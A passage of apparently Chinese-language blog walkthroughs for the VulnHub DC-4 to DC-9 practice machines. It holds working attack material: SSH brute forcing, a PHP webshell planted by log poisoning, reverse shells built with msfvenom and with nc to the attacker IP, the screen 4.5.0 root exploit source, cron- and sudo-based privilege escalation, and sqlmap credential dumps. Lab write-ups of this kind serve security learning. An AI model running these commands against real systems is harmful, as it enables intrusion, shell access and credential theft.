class="line">winner</span><br><span class="line">boomer</span><br><span class="line">lolita</span><br><span class="line">nastya</span><br><span class="line">alexis1</span><br><span class="line">carmen</span><br><span class="line">angelo</span><br><span class="line">nicholas1</span><br><span class="line">portugal</span><br><span class="line">precious</span><br><span class="line">jackass1</span><br><span class="line">jonathan1</span><br><span class="line">yfnfif</span><br><span class="line">bitch</span><br><span class="line">tiffany</span><br><span class="line">rabbit</span><br><span class="line">rainbow1</span><br><span class="line">angel123</span><br><span class="line">popcorn</span><br><span class="line">barbara</span><br><span class="line">brandy</span><br><span class="line">starwars1</span><br><span class="line">barney</span><br><span class="line">natalia</span><br><span class="line">jibril04</span><br><span class="line">hiphop</span><br><span class="line">tiffany1</span><br><span class="line">shorty</span><br><span class="line">poohbear1</span><br><span class="line">simone</span><br><span class="line">albert</span><br><span class="line">marlboro</span><br><span class="line">hardcore</span><br><span class="line">cowboys</span><br><span class="line">sydney</span><br><span class="line">alex</span><br><span class="line">scorpio</span><br><span class="line">1234512345</span><br><span class="line">q12345</span><br><span class="line">qq123456</span><br><span class="line">onelove</span><br><span class="line">bond007</span><br><span class="line">abcdefg1</span><br><span class="line">eagles</span><br><span class="line">crystal1</span><br><span class="line">azertyuiop</span><br><span class="line">winter</span><br><span class="line">sexy12</span><br><span class="line">angelina</span><br><span class="line">james</span><br><span class="line">svetlana</span><br><span class="line">fatima</span><br><span class="line">123456k</span><br><span class="line">icecream</span><br><span class="line">popcorn1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>用hydra进行爆破</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l jim -P ./dc4.txt  ssh://192.168.168.131</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/17/DC-4/8.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">账号：jim</span><br><span class="line">密码：jibril04</span><br></pre></td></tr></table></figure>

<p>用xshll或是kali连接到目标主机<br>看看身份</p>
<p><img src="/2022/04/17/DC-4/9.png" alt="img"></p>
<p>通过上传漏洞探测器，发现没有可用的提权漏洞<br>发现之前存在的一条信息</p>
<p><img src="/2022/04/17/DC-4/10.png" alt="img"></p>
<p>我有一条信息<br>去看看吧</p>
<p><img src="/2022/04/17/DC-4/11.png" alt="img"></p>
<p>这样就知道了charles的密码了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">账号：charles</span><br><span class="line">密码： ^xHhA&amp;hvim0y</span><br></pre></td></tr></table></figure>

<p>登录charles的号看看<br>看了charles可以用sudo了</p>
<p><img src="/2022/04/17/DC-4/12.png" alt="img"></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>teehee是一个小的编辑器<br>这里我通过crontab提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo teehee /etc/crontab</span><br><span class="line">* * * * * root <span class="built_in">chmod</span> 4777 /bin/sh  //4777普通用户也能执行</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/17/DC-4/14.png" alt="img"></p>
<p>分钟 小时 日期 月 周 用户 命令<br>ctrl+c退出</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/sh</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">cat</span> /root/the-flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/17/DC-4/13.png" alt="img"></p>
]]></content>
      <categories>
        <category>实践</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>提取</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-5</title>
    <url>/2022/04/17/DC-5/</url>
    <content><![CDATA[<p>渗透环境：DC5 <a href="https://www.vulnhub.com/entry/dc-5,314/">https://www.vulnhub.com/entry/dc-5,314/</a><br>攻击机：192.168.168.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="扫面存活主机"><a href="#扫面存活主机" class="headerlink" title="扫面存活主机"></a>扫面存活主机</h3><p>还是老规矩，nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/17/DC-5/1.png" alt="img"></p>
<p>发现目标主机为192.168.168.133</p>
<h3 id="扫描主机开放端口"><a href="#扫描主机开放端口" class="headerlink" title="扫描主机开放端口"></a>扫描主机开放端口</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.168.133</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/17/DC-5/2.png" alt="img"></p>
<p>开放了80端口浏览器打开</p>
<p><img src="/2022/04/17/DC-5/3.png" alt="img"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>只看到这个页面有注入的可能，试试<br>然后返回了thankyou.php过来</p>
<p><img src="/2022/04/17/DC-5/4.png" alt="img"></p>
<p>看看有没有存在sql注入，xss注入的可能<br>测试过，没反应<br>最后发现可以文件包含</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/17/DC-5/5.png" alt="img"></p>
<p>这里用日志注入的方法getshell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.168.133/&lt;?php @assert($_POST[&#x27;test&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>查看日志文件位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/17/DC-5/6.png" alt="img"></p>
<p>查看文件，用蚁剑连接</p>
<p><img src="/2022/04/17/DC-5/8.png" alt="img"></p>
<h3 id="msf反弹shell"><a href="#msf反弹shell" class="headerlink" title="msf反弹shell"></a>msf反弹shell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload payload/php/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.168.128 //攻击机ip</span><br><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.168.128 LPORT=4444 -f raw &gt; shell.php //生成shell</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>将shell.php通过蚁剑上传到&#x2F;tmp<br>访问对应shell.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">thankyou.php?file=/tmp/shell.php</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/17/DC-5/9.png" alt="img"></p>
<p>连接成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/17/DC-5/10.png" alt="img"></p>
<p>有个screen-4.5.0看看有没有漏洞可用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit screen 4.5.0</span><br><span class="line"><span class="built_in">cd</span> /usr/share/exploitdb/exploits/linux/local</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/17/DC-5/11.png" alt="img"></p>
<p>把第一个文件通过蚁剑上传，看看能不能run<br>结果报错了<br>分析对应sh</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># screenroot.sh</span></span><br><span class="line"><span class="comment"># setuid screen v4.5.0 local root exploit</span></span><br><span class="line"><span class="comment"># abuses ld.so.preload overwriting to get root.</span></span><br><span class="line"><span class="comment"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span></span><br><span class="line"><span class="comment"># HACK THE PLANET</span></span><br><span class="line"><span class="comment"># ~ infodox (25/1/2017) </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;~ gnu/screenroot ~&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] First, we create our shell and library...&quot;</span></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; /tmp/libhax.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">__attribute__ ((__constructor__))</span></span><br><span class="line"><span class="string">void dropshell(void)&#123;</span></span><br><span class="line"><span class="string">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span></span><br><span class="line"><span class="string">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span></span><br><span class="line"><span class="string">    unlink(&quot;/etc/ld.so.preload&quot;);</span></span><br><span class="line"><span class="string">    printf(&quot;[+] done!\n&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line"><span class="built_in">rm</span> -f /tmp/libhax.c</span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; /tmp/rootshell.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">int main(void)&#123;</span></span><br><span class="line"><span class="string">    setuid(0);</span></span><br><span class="line"><span class="string">    setgid(0);</span></span><br><span class="line"><span class="string">    seteuid(0);</span></span><br><span class="line"><span class="string">    setegid(0);</span></span><br><span class="line"><span class="string">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line"><span class="built_in">rm</span> -f /tmp/rootshell.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -<span class="built_in">ls</span> <span class="comment"># screen itself is setuid, so... </span></span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>

<p>根据上面逻辑得到3段代码，本地编译<br>libhax.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="type">void</span> <span class="title function_">dropshell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o libhax.so libhax.c</span><br></pre></td></tr></table></figure>

<p>rootshell.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o rootshell rootshell.c</span><br></pre></td></tr></table></figure>

<p>run.sh</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br><span class="line">cd /etc</span><br><span class="line">umask 000 # because</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed</span><br><span class="line">echo &quot;[+] Triggering...&quot;</span><br><span class="line">screen -ls # screen itself is setuid, so... </span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>

<p>把run.sh, rootshell, libhax.so上传到&#x2F;tmp文件夹中<br>执行run.sh文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./run.sh</span><br></pre></td></tr></table></figure>

<p>成功提权后</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /root/thisistheflag.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/17/DC-5/12.png" alt="img"></p>
<p>获得flag，DC-5clear</p>
]]></content>
      <categories>
        <category>实践</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>提权</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-6</title>
    <url>/2022/04/22/DC-6/</url>
    <content><![CDATA[<p>渗透环境：DC6 <a href="https://www.vulnhub.com/entry/dc-6,315/">https://www.vulnhub.com/entry/dc-6,315/</a><br>攻击机：192.168.168.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机存活扫描"><a href="#主机存活扫描" class="headerlink" title="主机存活扫描"></a>主机存活扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/22/DC-6/1.png" alt="img"></p>
<p>靶机ip为192.168.168.134</p>
<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS -p- 192.168.168.134</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/22/DC-6/2.png" alt="img"></p>
<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://wordy/ -e *</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/22/DC-6/4.png" alt="img"></p>
<p>发现wordpress后台</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>使用wpscan扫描</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://wordy  --enumerate</span><br></pre></td></tr></table></figure>

<p>发现存在的用户</p>
<p><img src="/2022/04/22/DC-6/3.png" alt="img"></p>
<p>使用burp进行爆破，失败<br>在原文下发现提示</p>
<p><img src="/2022/04/22/DC-6/5.png" alt="img"></p>
<p>使用提示中的字典</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</span><br></pre></td></tr></table></figure>

<p>爆破成功</p>
<p><img src="/2022/04/22/DC-6/6.png" alt="img"></p>
<p>登录后台寻找突破口<br>发现一次存在命令执行的地方<br>在kali开启监听端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure>

<p>抓包修改</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1 | nc 192.168.168.128 4444 -e /bin/bash</span><br></pre></td></tr></table></figure>

<p>发送<br>上传木马</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWydMMWFuZyddKTs/Pg==&quot;</span>|<span class="built_in">base64</span> -d &gt; shell.php</span><br></pre></td></tr></table></figure>

<p>蚁剑连接<br>在home下发现线索</p>
<p><img src="/2022/04/22/DC-6/8.png" alt="img"></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>ssh连接<br>账号：graham<br>密码：GSo7isUM1D4</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/22/DC-6/9.png" alt="img"></p>
<p>发现 &#x2F;home&#x2F;jens&#x2F;backups.sh没有密码<br>往里面添上&#x2F;bin&#x2F;bash</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> /bin/bash &gt;&gt; /home/jens/backups.sh</span><br></pre></td></tr></table></figure>

<p>以jens的身份执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u jens /home/jens/backups.sh</span><br></pre></td></tr></table></figure>

<p>发现当前身份变为jens</p>
<p><img src="/2022/04/22/DC-6/10.png" alt="img"></p>
<p>nmap提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;os.execute(&quot;/bin/bash&quot;)&#x27;</span> &gt; /tmp/shell</span><br><span class="line">sudo  nmap  --script= /tmp/shell</span><br></pre></td></tr></table></figure>

<p>提权成功</p>
<p><img src="/2022/04/22/DC-6/11.png" alt="img"></p>
<p>查看flag</p>
<p><img src="/2022/04/22/DC-6/12.png" alt="img"></p>
<p>DC-6 clear</p>
]]></content>
      <categories>
        <category>实践</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-7</title>
    <url>/2022/04/29/DC-7/</url>
    <content><![CDATA[<p>渗透环境DC-7：<a href="https://www.vulnhub.com/entry/dc-7,356/">https://www.vulnhub.com/entry/dc-7,356/</a><br>攻击机：192.168.168.128<br>靶机：192.168.168.135</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br><span class="line">nmap -sS -p- 192.168.168.135</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/29/DC-7/1.png" alt="img"></p>
<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>目标开启了22，80端口，先是访问80端口<br>cms为drupal<br>这里看到一个登录框</p>
<p><img src="/2022/04/29/DC-7/2.png" alt="img"></p>
<p>对admin进行弱命令爆破，失败<br>主页有这么的一个提示</p>
<p><img src="/2022/04/29/DC-7/3.png" alt="img"></p>
<p>突破口不在当前box中，我是想不到了，后来看别人的wp可算是明白了，原来突破口是这个</p>
<p><img src="/2022/04/29/DC-7/4.png" alt="img"></p>
<p>百度这个内容，可以找到一个github账号</p>
<p><img src="/2022/04/29/DC-7/5.png" alt="img"></p>
<p>看看有什么可用信息，在config.php文件中看到了账号密码</p>
<p><img src="/2022/04/29/DC-7/6.png" alt="img"></p>
<p>这个账号不是后台的，是主机的登录账号和密码，用xshell连接</p>
<p>登录后看到有new mail</p>
<p><img src="/2022/04/29/DC-7/7.png" alt="img"></p>
<p>看看mbox的内容</p>
<p>我们可以看到每隔一段时间，就会由root执行 &#x2F;opt&#x2F;scripts&#x2F;backups.sh</p>
<p><img src="/2022/04/29/DC-7/8.png" alt="img"></p>
<p>看看能不能往那个文件有什么内容，写点东西进去</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /opt/scripts/backups.sh</span><br></pre></td></tr></table></figure>

<h3 id="drush修改密码"><a href="#drush修改密码" class="headerlink" title="drush修改密码"></a>drush修改密码</h3><p><img src="/2022/04/29/DC-7/9.png" alt="img"></p>
<p>这里看到有drush和gpg命令<br>gpg主要是用来进行数字签名的操作<br>drush发现可以修改账号的密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /opt/scripts/backups.sh</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/29/DC-7/10.png" alt="img"></p>
<p>这能是root用户和www-data进行修改<br>显示改后台admin的密码看看</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html</span><br><span class="line">drush user-password admin --password=<span class="string">&quot;test&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/29/DC-7/11.png" alt="img"></p>
<p>后台登录</p>
<p><img src="/2022/04/29/DC-7/12.png" alt="img"></p>
<h3 id="存在可利用插件"><a href="#存在可利用插件" class="headerlink" title="存在可利用插件"></a>存在可利用插件</h3><p>这里可以添加模板，我们添加php模板，这样我们就可以发布php模板的帖子<br>下载地址：<a href="https://www.drupal.org/project/php">https://www.drupal.org/project/php</a></p>
<p><img src="/2022/04/29/DC-7/13.png" alt="img"></p>
<p>安装完后勾选php</p>
<p><img src="/2022/04/29/DC-7/14.png" alt="img"></p>
<p>content-&gt;add content-&gt;basic page<br>写入一句话木马，蚁剑连接</p>
<p><img src="/2022/04/29/DC-7/15.png" alt="img"></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>往&#x2F;opt&#x2F;scripts&#x2F;backups.sh写入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc 192.168.168.128 1111 -e /bin/bash </span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/29/DC-7/16.png" alt="img"></p>
<p>在kali上执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvnp 1111</span><br></pre></td></tr></table></figure>

<p>等待一段时间后就会上线了</p>
<p><img src="/2022/04/29/DC-7/17.png" alt="img"></p>
<p>获得flag</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">心得：这次的这个社工操作是真的没想到欸，也算是一次体验吧</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>实践</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-8</title>
    <url>/2022/04/29/DC-8/</url>
    <content><![CDATA[<p>渗透环境DC-8：<a href="https://www.vulnhub.com/entry/dc-8,367/">https://www.vulnhub.com/entry/dc-8,367/</a><br>攻击机：192.168.168.128<br>靶机：192.168.168.136</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br><span class="line">nmap -sS -p- 192.168.168.136</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/29/DC-8/1.png" alt="img"></p>
<p>目标开启了80，22端口<br>访问目标的网页</p>
<p><img src="/2022/04/29/DC-8/2.png" alt="img"></p>
<h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><p>不要对user页面进行爆破，会被ban掉的！！！<br>逛逛有没有什么注入点啥的，<br>发现存在sql注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.168.136/?nid=3</span><br></pre></td></tr></table></figure>

<p>我们用sqlmap进行一个爆破</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://192.168.168.136/?nid=1 --current-db //当前数据库的名称</span><br><span class="line">sqlmap -u http://192.168.168.136/?nid=1 -tables -D d7db  //当前数据库的表名</span><br><span class="line">sqlmap -u http://192.168.168.136/?nid=1 -columns -T <span class="built_in">users</span> -D d7db  //users表下的列名</span><br><span class="line">sqlmap -u http://192.168.168.136/?nid=1 -C <span class="string">&quot;name,pass&quot;</span> -T <span class="built_in">users</span> -D d7db --dump  //users表下的name与pass的内容</span><br></pre></td></tr></table></figure>

<p>这里我们用john进行hash破解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john ./hash.txt //hash文件里放我们的hash值</span><br></pre></td></tr></table></figure>

<p>最后发现只有john的密码能出来</p>
<p><img src="/2022/04/29/DC-8/3.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">账号：john</span><br><span class="line">密码：turtle</span><br></pre></td></tr></table></figure>

<p>登录后台，这个有点向DC-7的方式进行<br>我们这里选择进行一个监听<br>这里用的是msf<br>攻击机</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload payload/php/meterpreter/reverse_tcp //payload根据实际环境选择</span><br><span class="line"><span class="built_in">set</span> lhost IP //攻击机ip</span><br><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.168.136 LPORT=2222 -f raw &gt; shell.php //生成的php，将代码复制到以下图片中，LHOST为攻击机IP</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/29/DC-8/4.png" alt="img"></p>
<p>选择保存<br>再攻击机上run<br>然后在该页面进行请求</p>
<p><img src="/2022/04/29/DC-8/5.png" alt="img"></p>
<p>这是我们的msf就能连接上了</p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>先是一些常规操作</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">sudo -l</span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>最后找到了一个exim4的软件</p>
<p><img src="/2022/04/29/DC-8/6.png" alt="img"></p>
<p>查看对应的版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exim4 --version</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/29/DC-8/7.png" alt="img"></p>
<p>查是否存在可利用漏洞</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit exim 4.8</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/29/DC-8/8.png" alt="img"></p>
<p>这里我们将第二个脚本上到目标的&#x2F;tmp目录下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">upload ./46996.sh /tmp //上传</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">shell</span><br><span class="line"><span class="built_in">chmod</span> 4777 ./46996.sh</span><br><span class="line">./46996.sh -m netcat //命令来源，源代码有写的，可以看看</span><br></pre></td></tr></table></figure>

<p>执行完后我们就是root了</p>
<p><img src="/2022/04/29/DC-8/9.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /root/flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/29/DC-8/10.png" alt="img"></p>
<p>DC-8 clear</p>
]]></content>
      <categories>
        <category>实践</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-9</title>
    <url>/2022/04/30/DC-9/</url>
    <content><![CDATA[<p>渗透环境DC-9：<a href="https://www.vulnhub.com/entry/dc-9,412/">https://www.vulnhub.com/entry/dc-9,412/</a><br>攻击机：192.168.168.128<br>靶机：192.168.168.137</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br><span class="line">nmap -sS -p- 192.168.168.137</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/30/DC-9/1.png" alt="img"></p>
<p>开放的是80端口，访问</p>
<p><img src="/2022/04/30/DC-9/2.png" alt="img"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>发现有一个search框，可能存在sql注入，抓包扔到sqlmap试试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -r post.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/30/DC-9/3.png" alt="img"></p>
<p>确认存在sql注入<br>后面就是常规的查看数据库了, 因为不是dba所以不能用sqlmap getshell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -r post.txt --dbs</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/30/DC-9/4.png" alt="img"></p>
<p>有Staff与users这两个相关的数据库<br>看看这两个数据库有什么东西</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -r post.txt -D Staff --dump </span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/30/DC-9/5.png" alt="img"></p>
<p>下面的admin应该是后台的登录账号<br>这里的加密可以用sql自带的加密进行破解，也可以到md5解密网页破解<br>账号：admin<br>密码：transorbital1</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -r post.txt -D <span class="built_in">users</span> --dump </span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/30/DC-9/6.png" alt="img"></p>
<p>又是一些账号密码先记录下来吧</p>
<p>登录admin看看先</p>
